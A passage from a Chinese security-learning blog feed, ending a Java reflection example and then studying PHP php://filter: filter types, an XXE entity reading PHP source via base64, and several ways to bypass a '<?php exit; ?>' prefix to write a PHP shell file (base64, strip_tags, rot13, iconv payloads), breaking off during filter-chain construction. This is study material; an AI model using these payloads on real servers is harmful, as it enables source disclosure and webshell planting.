getAnnotations()</code> 返回这个方法上的注解</p><h4 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h4><p>当我们要获取私有构造方法、成员方法、成员变量时要修改权限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//构造方法</span><br>declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//成员方法</span><br>declaredMethod.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//成员变量</span><br>declaredField.setAccessible(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AAA</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;piiick&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">AAA</span><span class="hljs-params">()</span>&#123;&#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SayHello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello, i&#x27;m &quot;</span>+name+<span class="hljs-string">&quot; and &quot;</span>+age);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//获取Class对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> AAA.class;<br><span class="hljs-comment">//获取构造方法Constructor</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> personClass.getDeclaredConstructor();<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//根据指定的构造方法创建对象</span><br>        <span class="hljs-type">AAA</span> <span class="hljs-variable">aaa</span> <span class="hljs-operator">=</span> (AAA)declaredConstructor.newInstance();<br><span class="hljs-comment">//获取成员变量Field(name)并且赋值给name</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> personClass.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> declaredField.get(aaa);<br><span class="hljs-comment">//获取成员变量Field(age)并且修改age的值为23</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">ageField</span> <span class="hljs-operator">=</span> personClass.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>        ageField.setAccessible(<span class="hljs-literal">true</span>);<br>        ageField.set(aaa, <span class="hljs-number">23</span>);<br><span class="hljs-comment">//获取成员方法Method(sayHello)</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">sayHello</span> <span class="hljs-operator">=</span> personClass.getDeclaredMethod(<span class="hljs-string">&quot;SayHello&quot;</span>);<br>        sayHello.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//调用 `aaa` 对象上的这个方法</span><br>        sayHello.invoke(aaa);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>php-filter学习</title>
    <link href="/2024/07/27/php-filter%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/07/27/php-filter%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>本来是想单独对php-filter chain的convert.iconv 字符转换研究的，但是突然翻到p神文章和其他文章，故想进一步学习一下。</p><p>参考：<a href="https://tyskill.github.io/posts/php_filter_%E8%BF%87%E6%BB%A4%E5%99%A8/#contents:trick">php:&#x2F;&#x2F;filter过滤器学习记录 | tyskillのBlog</a></p><p>参考：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用 | 离别歌 (leavesongs.com)</a></p><p>参考:<a href="https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/">FilterChain攻击解析及利用 </a></p><p> <code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的<a href="http://filters.html/">筛选过滤</a>应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <a href="http://function.readfile.html/">readfile()</a>、 <a href="http://function.file.html/">file()</a> 和 <a href="http://function.file-get-contents.html/">file_get_contents()</a>， 在数据流内容读取之前没有机会应用其他过滤器。</p><hr><h3 id="对php-filter的过滤器的作用的理解："><a href="#对php-filter的过滤器的作用的理解：" class="headerlink" title="对php://filter的过滤器的作用的理解："></a>对<code>php://filter</code>的过滤器的作用的理解：</h3><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><table><thead><tr><th>名称</th><th align="left">描述</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read&#x3D;&lt;读链的筛选列表&gt;</td><td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td>write&#x3D;&lt;写链的筛选列表&gt;</td><td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs txt"># 字符串过滤器<br>string.rot13       //rot13转换<br>string.toupper     //将字符大写<br>string.tolower     //将字符小写<br>string.strip_tags  //去除空字符、HTML和PHP标记后的结果<br><br># 转换过滤器<br>convert.base64-encode       //base64编码<br>convert.base64-decode       //base64解码<br>convert.quoted-printable-encode //quoted-printable编码<br>convert.quoted-printable-decode //quoted-printable解码<br>convert.iconv                   //实现任意两种编码之间的转换<br><br># 压缩过滤器<br>zlib.deflate       //压缩过滤器<br>zlib.inflate       //解压过滤器<br>bzip2.compress     //压缩过滤器<br>bzip2.decompress   //解压过滤器<br><br># 加密过滤器<br>mcrypt.*    //加密过滤器<br>mdecrypt.*  //解密过滤器<br></code></pre></td></tr></table></figure><h4 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h4><h5 id="string-rot13"><a href="#string-rot13" class="headerlink" title="string.rot13"></a>string.rot13</h5><p>（自 PHP 4.3.0 起）对字符进行简单的单表替换，将字母表的后13位字母替换前面的13位字母，遇到其他的字符直接跳过。</p><h5 id="string-toupper、string-tolower"><a href="#string-toupper、string-tolower" class="headerlink" title="string.toupper、string.tolower"></a>string.toupper、string.tolower</h5><p>（自 PHP 5.0.0 起）字符串大小写转换</p><h5 id="string-strip-tags"><a href="#string-strip-tags" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h5><p>string.strip_tags返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。<strong>本特性已自 PHP 7.3.0 起废弃</strong>。</p><blockquote><p>注意：HTML标签和 PHP 标签<code>&lt;?代码?&gt;</code>也会被去除。这里是硬编码处理的，所以无法通过 allowable_tags 参数进行改变。</p></blockquote><h4 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h4><h5 id="convert-base64-encode"><a href="#convert-base64-encode" class="headerlink" title="convert.base64-encode"></a>convert.base64-encode</h5><p>对给定字符串进行base64编码</p><h5 id="convert-base64-decode"><a href="#convert-base64-decode" class="headerlink" title="convert.base64-decode"></a>convert.base64-decode</h5><p>对给定base64编码内容解码</p><blockquote><p>注意：</p><p>1、base64解码时是4bytes一组，因此将目标字符解码成乱码时需手动添加字符凑够4的倍数</p><p>2、<code>convert.base64-decode</code>过滤器读文件时会将一些非base64字符给过滤掉后再进行<code>decode</code>，和一些过滤器组合可以用来删除文件内容</p></blockquote><h5 id="convert-quoted-printable-encode"><a href="#convert-quoted-printable-encode" class="headerlink" title="convert.quoted-printable-encode"></a>convert.quoted-printable-encode</h5><p>将 8-bit 字符串转换成 quoted-printable 字符串</p><blockquote><p>8-bit字符串：10000000<del>11111111，即ASCII值在128</del>255之间的字符串</p><p>quoted-printable 字符串：<code>=十六进制形式</code>，如&#x3D;42为B</p></blockquote><h5 id="convert-quoted-printable-decode"><a href="#convert-quoted-printable-decode" class="headerlink" title="convert.quoted-printable-decode"></a>convert.quoted-printable-decode</h5><p>将 quoted-printable 字符串转换为 8-bit 字符串</p><blockquote><p>注意：可以转化从&#x3D;00到&#x3D;FF，即ASCII值从0~255之间的字符串</p></blockquote><h5 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv"></a>convert.iconv</h5><p>字符串按要求的字符编码来转换</p><p>使用格式：<code>convert.iconv.当前编码.目标编码</code></p><p>支持的<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">编码方式</a></p><blockquote><p>* 表示该编码也可以在正则表达式中使用。 ** 表示该编码自 <strong>PHP</strong> 5.4.0 始可用。</p></blockquote><h4 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h4><h5 id="zlib-deflate压缩、zlib-inflate解压"><a href="#zlib-deflate压缩、zlib-inflate解压" class="headerlink" title="zlib.deflate压缩、zlib.inflate解压"></a>zlib.deflate压缩、zlib.inflate解压</h5><blockquote><p>自 PHP 5.1.0 起，在激活 <a href="https://www.php.net/manual/zh/ref.zlib.php">zlib</a>的前提下可用。也可以通过安装来自 <a href="https://pecl.php.net/">» PECL</a>的 <a href="https://pecl.php.net/package/zlib_filter">» zlib_filter</a>包作为一个后门在 <code>5.0.x</code>版中使用。此过滤器在 PHP 4 中 <em>不可用</em>。</p></blockquote><p>相对于<a href="https://www.php.net/manual/zh/wrappers.compression.php">压缩封装协议</a>可以在本地文件系统中 创建 gzip 和 bz2 兼容文件，但不可以在网络的流中提供通用压缩的意思，也不可以将一个非压缩的流转换成一个压缩流。<strong>压缩过滤器<code>zlib.\*</code>可以在任何时候应用于任何流资源</strong>。</p><blockquote><p><strong>注意</strong>: 压缩过滤器不产生命令行工具如 <code>gzip</code>的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</p></blockquote><h5 id="bzip2-compress、bzip2-decompress"><a href="#bzip2-compress、bzip2-decompress" class="headerlink" title="bzip2.compress、bzip2.decompress"></a>bzip2.compress、bzip2.decompress</h5><blockquote><p>自PHP 5.1.0 起，在激活 <a href="https://www.php.net/manual/zh/ref.bzip2.php">bz2</a>支持的前提下可用。也可以通过安装来自 <a href="https://pecl.php.net/">» PECL</a>的 <a href="https://pecl.php.net/package/bz2_filter">» bz2_filter</a>包作为一个后门在 <code>5.0.x</code>版中使用。此过滤器在 PHP 4 中不可用。</p></blockquote><p>工作方式与上面相同</p><h4 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h4><h5 id="mcrypt-、mdecrypt"><a href="#mcrypt-、mdecrypt" class="headerlink" title="mcrypt.、mdecrypt."></a>mcrypt.<em>、mdecrypt.</em></h5><p><code>mcrypt.*</code>和 <code>mdecrypt.*</code>使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 <a href="https://www.php.net/manual/zh/ref.mcrypt.php">mcrypt 扩展库</a>中相同的算法，格式为 <code>mcrypt.ciphername</code>，其中 <code>ciphername</code>是密码的名字，将被传递给 <a href="https://www.php.net/manual/zh/function.mcrypt-module-open.php">mcrypt_module_open()</a>。</p><p>过滤器参数</p><table><thead><tr><th>参数</th><th>是否必须</th><th>默认值</th><th>取值举例</th></tr></thead><tbody><tr><td>mode</td><td>可选</td><td>cbc</td><td>cbc, cfb, ecb, nofb, ofb, stream</td></tr><tr><td>algorithms_dir</td><td>可选</td><td>ini_get(‘mcrypt.algorithms_dir’)</td><td>algorithms 模块的目录</td></tr><tr><td>modes_dir</td><td>可选</td><td>ini_get(‘mcrypt.modes_dir’)</td><td>modes 模块的目录</td></tr><tr><td>iv</td><td>必须</td><td>N&#x2F;A</td><td>典型为 8，16 或 32 字节的二进制数据。根据密码而定</td></tr><tr><td>key</td><td>必须</td><td>N&#x2F;A</td><td>典型为 8，16 或 32 字节的二进制数据。根据密码而定</td></tr></tbody></table><hr><h3 id="php-filter在XXE中的应用："><a href="#php-filter在XXE中的应用：" class="headerlink" title="php://filter在XXE中的应用："></a><code>php://filter</code>在XXE中的应用：</h3><p>php:&#x2F;&#x2F;filter经常出现在XXE漏洞中，因为XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code>。因为PHP是基于标签的脚本语言：<code>&lt;?php  ?&gt;</code>,这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，其中的内容（如特殊字符）又有可能和标准XML冲突，所以导致出错。</p><p>所以，为了读取包含有敏感信息的PHP等源文件，我们就要先将”可能引发冲突的PHP代码”编码一遍，用到php:&#x2F;&#x2F;filter。</p><p>php:&#x2F;&#x2F;filter是PHP语言中特有的协议流，作用是作为一个”中间流”来处理其他流。比如，我们可以将如下一行代码将POST内容转换成base-64编码并输出：</p><p><code>readfile(&quot;php://filter/read=convert.base64-encode/resource=php://input&quot;);</code></p><p><img src="/images/filter/1.png"></p><p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php:&#x2F;&#x2F;filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。</p><p>我们可以使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">root</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=./xxe.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">methodname</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">methodname</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="利用php-filter绕过die或exit"><a href="#利用php-filter绕过die或exit" class="headerlink" title="利用php:&#x2F;&#x2F;filter绕过die或exit"></a>利用php:&#x2F;&#x2F;filter绕过die或exit</h3><h4 id="利用base64-decode特性"><a href="#利用base64-decode特性" class="headerlink" title="利用base64_decode特性"></a>利用base64_decode特性</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;<br><span class="hljs-variable">$content</span> .= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;txt&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了。</p><p>但是这里的<code>$_POST[&#39;filename&#39;]</code>是可控制协议的，我们即可使用php:&#x2F;&#x2F;filter流的base64-decode方法，将<code>$content</code>解码，利用php base_decode函数特性去除”死亡exit”。</p><p>在base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p><p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br><span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode来首先对其解码。在解码过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有”phpexit”和我们传入的其他字符。</p><p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所有给他增加一个”a”一共8个字符。”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了</p><p>此处我用POST传参没反应，故改为GET</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;<br><span class="hljs-variable">$content</span> .= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p>payload为:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">filename=php://filter/write=convert.base64-decode/resource=shell.php&amp;txt=aPD9waHAgcGhwaW5mbygpOyA/Pg==<br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/images/filter/2.png"></p><p><img src="/images/filter/3.png"></p><h4 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a>利用字符串操作方法</h4><p>除了直接使用base64特性的方法以外，我们还可以使用<code>strip_tags</code>函数去除<code>&lt;?php exit; ?&gt;</code>，php:&#x2F;&#x2F;filter也是支持这个方法的。</p><p>使用<code>php://filter/read=string.strip_tags/resource=php://input</code></p><p>在文件中写入<code>echo readfile(&#39;php://filter/read=string.strip_tags/resource=php://input&#39;);</code>可以查看效果：</p><p><img src="/images/filter/4.png"></p><p>可以看到<code>&lt;?php exit; ?&gt;</code>被去除掉了，但是如果我们想写一个webshell同样会被去除。</p><p>还好php:&#x2F;&#x2F;filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。”死亡exit”在第一步被去除，webshell在第二步被还原。</p><p><img src="/images/filter/5.png"></p><p><img src="/images/filter/6.png"></p><h4 id="利用rot13编码"><a href="#利用rot13编码" class="headerlink" title="利用rot13编码"></a>利用rot13编码</h4><p>在不开起short_open_tag的情况下，可以实现</p><p>对webshell进行rot13编码<a href="https://lzltool.cn/Tools/Rot13">ROT13加密&#x2F;解密 </a></p><p><img src="/images/filter/7.png"></p><p>写入webshell</p><p><img src="/images/filter/8.png"></p><p>查看shell111.php</p><p><img src="/images/filter/9.png"></p><p>注意：只有在短标签未开起情况下<code>&lt;?cuc rkvg; ?&gt;</code>才不会被识别为php。</p><h4 id="利用convert-iconv"><a href="#利用convert-iconv" class="headerlink" title="利用convert.iconv.*"></a>利用convert.iconv.*</h4><p><code>&lt;?php exit();</code>字符一共13位</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># usc-2: 对目标字符串进行2位一反转</span><br><span class="hljs-string">?f</span>ilename=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.iconv.<span class="hljs-variable constant_">UCS</span>-2LE.<span class="hljs-variable constant_">UCS</span>-2BE/resource=shel3.php&amp;txt=<span class="hljs-string">?&lt;</span>hp phpipfn(o;)<br><span class="hljs-comment"># usc-4: 对目标字符串进行4位一反转</span><br><span class="hljs-string">?f</span>ilename=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.iconv.<span class="hljs-variable constant_">UCS</span>-2LE.<span class="hljs-variable constant_">UCS</span>-2BE/resource=shell3.php&amp;txt=<span class="hljs-string">?&lt;</span>hp phpipfn(o;)<br></code></pre></td></tr></table></figure><p>写入</p><p><img src="/images/filter/10.png"></p><p>查看</p><p><img src="/images/filter/11.png"></p><hr><h3 id="filter-chain构造与convert-iconv-字符转换"><a href="#filter-chain构造与convert-iconv-字符转换" class="headerlink" title="filter chain构造与convert.iconv 字符转换"></a>filter chain构造与convert.iconv 字符转换</h3><p>通过<code>iconv -l</code>可以查看本地的iconv编码：</p><p><img src="/images/filter/12.png"></p><p>这里我们以原理核心 <code>convert.iconv</code>的<code>CSISO2022KR</code>为例子</p><h4 id="特性一-去除不可见字符"><a href="#特性一-去除不可见字符" class="headerlink" title="特性一(去除不可见字符)"></a>特性一(去除不可见字符)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content1</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/convert.iconv.UTF8.CSISO2022KR/resource=data://,bbb&#x27;</span>);<br><span class="hljs-variable">$content2</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode/resource=data://,bbb&#x27;</span>);<br><span class="hljs-variable">$content3</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,bbb&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$content1</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$content1</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;==========================================&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$content2</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$content2</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;==========================================&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$content3</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$content3</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果:</p><p><img src="/images/filter/13.png"></p><p>经过从<code>UTF-8-&gt;CSISO2022KR</code>后，bbb变成七个字节，但是只显示了三个b，因为剩下还有几个不可见字符，我们把下面的十六进制转换为文本<a href="https://www.sojson.com/hexadecimal.html">16进制转换</a></p><p><img src="/images/filter/14.png"></p><p>可以看到输出的是<code>$)Cbbb</code>。</p><p>但是由于base-64的特性，将这串字符base-64解码后，<code>$)</code>作为无效字符将会被删掉，解码得到的’     ��’就是由Cbbb解码得到的，证明<code>$)</code>确实被删除。</p><p><img src="/images/filter/15.png"></p><p>我们再对解码后的字符串用base-64加密后则会得到<code>Cbbb</code></p><p>利用特性一，我们可以构造一个字母C并且拼接到bbb之前。</p><h4 id="特性二-连续可连接性"><a href="#特性二-连续可连接性" class="headerlink" title="特性二(连续可连接性)"></a>特性二(连续可连接性)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content1</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4/resource=data://,bbb&quot;</span>);<br><span class="hljs-variable">$content2</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,bbb&#x27;</span>);<br><span class="hljs-variable">$content3</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode/resource=data://,bbb&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$content1</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$content1</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;==========================================&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$content2</span>);<br><span class="hljs-title 